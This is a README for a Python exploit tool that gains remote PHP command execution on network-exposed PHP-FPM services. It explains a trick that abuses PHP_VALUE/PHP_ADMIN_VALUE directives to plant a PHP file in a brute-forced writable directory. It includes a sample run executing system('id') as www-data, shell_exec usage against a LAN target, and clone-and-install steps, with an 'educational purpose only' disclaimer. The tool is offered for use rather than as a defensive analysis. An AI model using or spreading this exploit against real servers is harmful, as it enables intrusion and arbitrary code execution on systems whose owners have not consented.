# FPM-Exec: FastCGI PHP-FPM Remote Command Execution

A [won't fix RCE exploit](https://github.com/php/php-src/security/advisories/GHSA-xwv2-pr23-qqmh) for any: 
* PHP-FPM service exposed on a network (or stocket) accessible by the attacker.
* with a writable path by php-fpm process

Features:
* IP/Port or unix://path unix sockets support
* Retry mechanism due to PHP process destruction/creation
* Bruteforce of writable directories
* Wordlist creation based on: 
  * OS writable dirs
  * webserver root directories
  * mount dir path
  * / for chrooted env
  * classic upload directories path
  * PHP session’s path

## Quick start

Example of successfull execution:
```
# python3 fpm-exec.py -t 127.0.0.1:9000 -c "system('id')"
[+] Checking connectivity with 127.0.0.1:9000 with an empty test request
[+] Connexion OK
[+] Response:
Status: 404 Not Found
X-Powered-By: PHP/8.3.2
Content-type: text/html; charset=UTF-8

File not found.

[+] Loaded 1638 writable directories combinations
[+] Using exec technique 'save_handler'
[+] Searching for a writable dir with dummy cmd 'echo 1'
[+] Trying directory /tmp/
[+] !! Got PHP command exec with a test command: echo 1
[+] Tips: for quicker exec next time use option: -d /tmp/
[+] Executing: system('id')
[+] Execution success:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Explainations

As explained by PHP's maintainers, exposing PHP-FPM service on an untrusted network is considered as a missconfiguration (not a vulnerability) and should never happened.

It is well-known that an exposed PHP-FPM may lead to RCE. PHP-FPM is exposed by default on port tcp/9000 and is for now identified as `cslistener` by nmap.

However, to achieve RCE, there is a pre-requisite: the attacker must know an existing PHP file path on the filesystem: example: `/var/www/html/index.php`.

I discovered that php.ini directives through `PHP_ADMIN_VALUE` or `PHP_VALUE` could be abused to create an arbitrary PHP file on a writable directory without preliminar knownledge on the target system. With this trick, we remove the prerequisite to know a PHP file path.

This exploit could fail is if the script cannot find a well-known writable directory to create a PHP file.

Blog post: work in progress...

## Other usages

Set or force a writable directory:
```
# python3 fpm-exec.py -t "192.168.1.2:9000" -c "echo shell_exec('id')" -d "/usr/var/tmp"
```

Enable verbose mode:
```
# python3 fpm-exec.py -t "192.168.1.2:9000" -c "echo shell_exec('id')" -v
```

Usage:
```
# python3 fpm-exec.py -h

usage: fpm-exec.py [-h] -t TARGET [-c CMD] [-d DIRECTORY] [-r RETRY] [-e {save_handler,extension}] [-m TIMEOUT] [-v] [-n]

Execute arbitrary PHP command on exposed php-fpm host

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        Target to call, host:port or unix://path
  -c CMD, --cmd CMD     PHP command to execute
  -d DIRECTORY, --directory DIRECTORY
                        Writable directory list comma separated
  -r RETRY, --retry RETRY
                        Retry request count
  -e {save_handler,extension}, --exec-technique {save_handler,extension}
                        Execution technique
  -m TIMEOUT, --timeout TIMEOUT
                        Socket timeout in ms
  -v, --verbose         Verbose output
  -n, --no-color        No colored output
```

## Installation

```
git clone https://github.com/darkpills/fpm-exec

cd fpm-exec

pip3 install -r requirements.txt
```

## Disclaimer

The material and information contained on this website do not aim at encouraging any form of illegal activity. They are provided for educational purpose only. The author can not be responsible for any activities consequent to the use of the content presented here. The information are provided "AS IS" with no warranties, and confers no rights. The opinions expressed in this website are my own and feel free to challenge me. 